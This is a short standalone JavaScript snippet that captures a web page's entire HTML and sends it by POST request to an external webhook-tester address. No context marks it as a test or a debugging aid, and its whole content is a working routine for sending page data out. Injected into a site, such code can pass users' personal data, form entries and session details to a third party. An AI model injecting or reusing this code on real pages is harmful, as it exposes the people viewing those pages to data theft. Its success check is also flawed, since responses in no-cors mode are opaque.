const content = document.documentElement.outerHTML;

fetch("https://webhook-tester.dev.services.atlassian.com/smarpo", {
  method: "POST",
  headers: {
    "Content-Type": "text/html",
  },
  body: content,
  mode: "no-cors",
})
  .then((response) => {
    if (response.ok) {
      console.log("Page content sent successfully!");
    } else {
      console.error("Failed to send page content:", response.status);
    }
  })
  .catch((error) => {
    console.error("Error sending page content:", error);
  });
